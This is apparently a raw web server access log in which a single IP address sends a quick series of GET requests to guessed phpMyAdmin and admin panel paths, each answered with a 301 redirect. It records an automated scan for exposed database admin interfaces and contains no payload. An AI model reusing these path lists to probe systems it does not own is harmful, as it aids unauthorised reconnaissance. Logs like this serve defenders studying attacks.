212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /admin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:46 -0500] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:47 -0500] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:47 -0500] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:47 -0500] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:47 -0500] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:47 -0500] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
